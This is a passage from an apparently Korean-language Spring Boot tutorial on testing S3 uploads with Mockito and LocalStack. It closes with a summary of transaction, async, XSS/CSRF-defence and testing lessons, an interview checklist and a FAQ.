            .title(request.getTitle())
            .imageUrl(expectedImageUrl)
            .build();

        when(projectRepository.save(any(Project.class)))
            .thenReturn(savedProject);

        // When
        Project result = projectService.saveProject(request);

        // Then
        assertThat(result.getId()).isEqualTo(1L);
        assertThat(result.getTitle()).isEqualTo("Test Project");
        assertThat(result.getImageUrl()).isEqualTo(expectedImageUrl);

        // S3 업로드가 1번 호출되었는지 검증
        verify(s3Template, times(1))
            .upload(any(BufferedImage.class), anyString());

        // Repository save가 1번 호출되었는지 검증
        verify(projectRepository, times(1))
            .save(any(Project.class));
    }

    @Test
    @DisplayName("S3 업로드 실패 시 예외가 발생한다")
    void saveProject_S3UploadFails() {
        // Given
        ProjectRequest request = createProjectRequest();

        when(s3Template.upload(any(), anyString()))
            .thenThrow(new S3Exception("Upload failed"));

        // When & Then
        assertThatThrownBy(() -> projectService.saveProject(request))
            .isInstanceOf(S3Exception.class)
            .hasMessage("Upload failed");

        // Repository save는 호출되지 않았는지 검증
        verify(projectRepository, never()).save(any());
    }

    @Test
    @DisplayName("프로젝트 삭제 시 S3 파일도 함께 삭제한다")
    void deleteProject_Success() {
        // Given
        Long projectId = 1L;
        String imageKey = "projects/1/image.jpg";

        Project project = Project.builder()
            .id(projectId)
            .title("Test")
            .imageKey(imageKey)
            .build();

        when(projectRepository.findById(projectId))
            .thenReturn(Optional.of(project));

        doNothing().when(s3Template).deleteObject(imageKey);
        doNothing().when(projectRepository).delete(project);

        // When
        projectService.deleteProject(projectId);

        // Then
        verify(s3Template, times(1)).deleteObject(imageKey);
        verify(projectRepository, times(1)).delete(project);
    }

    private MultipartFile createMockMultipartFile() {
        return new MockMultipartFile(
            "image",
            "test.jpg",
            "image/jpeg",
            "test image content".getBytes()
        );
    }
}
```

---

#### 2️⃣ 통합 테스트 (LocalStack)

##### Docker Compose 설정

```yaml
version: "3.8"

services:
  localstack:
    image: localstack/localstack:latest
    ports:
      - "4566:4566"
    environment:
      - SERVICES=s3
      - DEBUG=1
      - DATA_DIR=/tmp/localstack/data
    volumes:
      - ./localstack-data:/tmp/localstack
```

##### 통합 테스트 코드

```java
@SpringBootTest
@Testcontainers
@ActiveProfiles("test")
class ProjectServiceIntegrationTest {

    @Container
    static LocalStackContainer localstack = new LocalStackContainer(
        DockerImageName.parse("localstack/localstack:latest")
    ).withServices(LocalStackContainer.Service.S3);

    @Autowired
    private ProjectService projectService;

    @Autowired
    private ProjectRepository projectRepository;

    private AmazonS3 s3Client;
    private String bucketName = "test-bucket";

    @BeforeEach
    void setUp() {
        // LocalStack S3 클라이언트 생성
        s3Client = AmazonS3ClientBuilder
            .standard()
            .withEndpointConfiguration(
                new AwsClientBuilder.EndpointConfiguration(
                    localstack.getEndpointOverride(LocalStackContainer.Service.S3).toString(),
                    localstack.getRegion()
                )
            )
            .withCredentials(
                new AWSStaticCredentialsProvider(
                    new BasicAWSCredentials("test", "test")
                )
            )
            .build();

        // 테스트용 버킷 생성
        s3Client.createBucket(bucketName);
    }

    @Test
    @DisplayName("프로젝트 저장 시 실제 S3(LocalStack)에 파일이 업로드된다")
    void saveProject_UploadsToRealS3() throws IOException {
        // Given
        ProjectRequest request = ProjectRequest.builder()
            .title("Integration Test Project")
            .description("Real S3 upload test")
            .image(createTestImage())
            .build();

        // When
        Project saved = projectService.saveProject(request);

        // Then
        assertThat(saved.getId()).isNotNull();
        assertThat(saved.getImageUrl()).isNotEmpty();

        // S3에 실제로 파일이 존재하는지 확인
        String key = extractKeyFromUrl(saved.getImageUrl());
        boolean exists = s3Client.doesObjectExist(bucketName, key);
        assertThat(exists).isTrue();

        // DB에도 저장되었는지 확인
        Project found = projectRepository.findById(saved.getId()).orElseThrow();
        assertThat(found.getTitle()).isEqualTo("Integration Test Project");
    }

    @Test
    @DisplayName("프로젝트 삭제 시 S3 파일도 함께 삭제된다")
    void deleteProject_DeletesFromRealS3() throws IOException {
        // Given
        ProjectRequest request = createProjectRequest();
        Project saved = projectService.saveProject(request);
        String key = extractKeyFromUrl(saved.getImageUrl());

        // 파일이 존재하는지 확인
        assertThat(s3Client.doesObjectExist(bucketName, key)).isTrue();

        // When
        projectService.deleteProject(saved.getId());

        // Then
        // S3에서 파일이 삭제되었는지 확인
        assertThat(s3Client.doesObjectExist(bucketName, key)).isFalse();

        // DB에서도 삭제되었는지 확인
        assertThat(projectRepository.findById(saved.getId())).isEmpty();
    }
}
```

---

### 📊 테스트 전략 비교

|  테스트 유형  | 단위 테스트 (Mock) | 통합 테스트 (LocalStack) |
| :-----------: | :----------------: | :----------------------: |
|   **속도**    |    매우 빠름 ⚡    |         느림 🐢          |
|   **비용**    |        무료        |    Docker 리소스 필요    |
|  **실제성**   |        낮음        |           높음           |
|  **격리성**   |        완벽        |           보통           |
| **사용 시점** |     로직 검증      |         E2E 검증         |
|   **CI/CD**   |     매번 실행      |      주요 브랜치만       |

---

### 🎯 테스트 피라미드

```
         /\
        /  \  E2E Tests (LocalStack)
       /    \
      /------\  Integration Tests
     /        \
    /----------\  Unit Tests (Mock)
   --------------
```

**권장 비율**: 단위 70% : 통합 20% : E2E 10%

---

## 💡 핵심 요약

### 📌 5가지 핵심 교훈

|          주제          | 핵심 메시지                    | 실무 적용                   |
| :--------------------: | ------------------------------ | --------------------------- |
| **1️⃣ 트랜잭션 정합성** | 외부 시스템은 트랜잭션 범위 밖 | Soft Delete + 이벤트 리스너 |
|   **2️⃣ 비동기 처리**   | 무거운 작업은 스레드 풀 분리   | @Async 또는 Lambda          |
|    **3️⃣ XSS 방어**     | 사용자 입력은 항상 Sanitize    | OWASP HTML Sanitizer        |
|    **4️⃣ CSRF 보호**    | 운영 환경에서는 필수           | Thymeleaf 자동 처리 활용    |
|   **5️⃣ 테스트 전략**   | 외부 의존성은 Mock             | Mockito + LocalStack        |

---

### 🎓 기술 면접 체크리스트

#### 트랜잭션 & 정합성

- [ ] `@Transactional` 범위와 한계 이해
- [ ] Soft Delete 패턴 설명 가능
- [ ] `@TransactionalEventListener` 활용법 숙지
- [ ] 고아 객체 문제 인식

#### 성능 & 확장성

- [ ] 동기/비동기 처리 차이 설명 가능
- [ ] `@Async` 설정과 사용법 숙지
- [ ] Thread Pool 개념 이해
- [ ] 서버리스 아키텍처 장단점 파악

#### 보안

- [ ] XSS 공격 원리와 방어법 설명 가능
- [ ] CSRF 토큰 메커니즘 이해
- [ ] HTML Sanitization 필요성 인식
- [ ] CSP(Content Security Policy) 개념 파악

#### 테스트

- [ ] Mock vs Stub vs Spy 차이 설명 가능
- [ ] Mockito 기본 사용법 숙지
- [ ] TestContainers/LocalStack 활용 경험
- [ ] 테스트 피라미드 이해

---

## 🚀 추가 학습 자료

### 📚 공식 문서

- [Spring Transaction Management](https://docs.spring.io/spring-framework/docs/current/reference/html/data-access.html#transaction)
- [Spring @Async](https://docs.spring.io/spring-framework/docs/current/reference/html/integration.html#scheduling)
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Spring Security CSRF](https://docs.spring.io/spring-security/reference/features/exploits/csrf.html)
- [Mockito Documentation](https://javadoc.io/doc/org.mockito/mockito-core/latest/org/mockito/Mockito.html)

### 🎥 추천 강의

- 인프런: "실전! 스프링 부트와 JPA 활용" (김영한)
- Udemy: "AWS Lambda & Serverless Framework"
- YouTube: "OWASP Top 10 Web Application Security Risks"

### 📖 추천 도서

- "Real MySQL 8.0" - 백은빈, 이성욱
- "자바 ORM 표준 JPA 프로그래밍" - 김영한
- "스프링 마이크로서비스 코딩 공작소" - 존 카넬

---

## 💬 FAQ

<details>
<summary><strong>Q1. Soft Delete를 사용하면 성능에 영향이 있나요?</strong></summary>

네, 영향이 있을 수 있습니다.

**성능 저하 요인**:

- 모든 쿼리에 `WHERE deleted_at IS NULL` 조건 추가
- 인덱스 효율 감소
- 테이블 크기 증가

**해결 방법**:

```sql
-- deleted_at에 인덱스 추가
CREATE INDEX idx_deleted_at ON project(deleted_at);

-- 파티셔닝 활용
CREATE TABLE project_active PARTITION OF project
    FOR VALUES IN (NULL);
CREATE TABLE project_deleted PARTITION OF project
    DEFAULT;
```

정기적으로 오래된 삭제 데이터를 아카이브 테이블로 이동하세요.

</details>

<details>
<summary><strong>Q2. @Async 사용 시 트랜잭션은 어떻게 처리하나요?</strong></summary>

**주의사항**:

- `@Async` 메서드는 별도 스레드에서 실행되므로 트랜잭션이 전파되지 않습니다
- 호출한 메서드의 트랜잭션과 완전히 독립적입니다

**올바른 사용**:

```java
@Service
public class AsyncService {

    @Async
    @Transactional  // 새로운 트랜잭션 시작
    public CompletableFuture<Void> processAsync(Long id) {
        // 이 메서드 내부에서 별도 트랜잭션 관리
        return CompletableFuture.completedFuture(null);
    }
}
```

</details>

<details>
<summary><strong>Q3. LocalStack과 실제 AWS의 차이점은?</strong></summary>

**LocalStack의 한계**:

- 모든 AWS 기능을 100% 지원하지 않음
- 일부 서비스는 Pro 버전에서만 사용 가능
- 성능 특성이 실제 AWS와 다를 수 있음

**권장 사용**:

- 로컬 개발 및 단위/통합 테스트
- CI/CD 파이프라인의 초기 단계
- 프로토타이핑 및 학습

**실제 AWS 사용**:

- E2E 테스트
- 스테이징 환경 테스트
- 성능 테스트
</details>

---
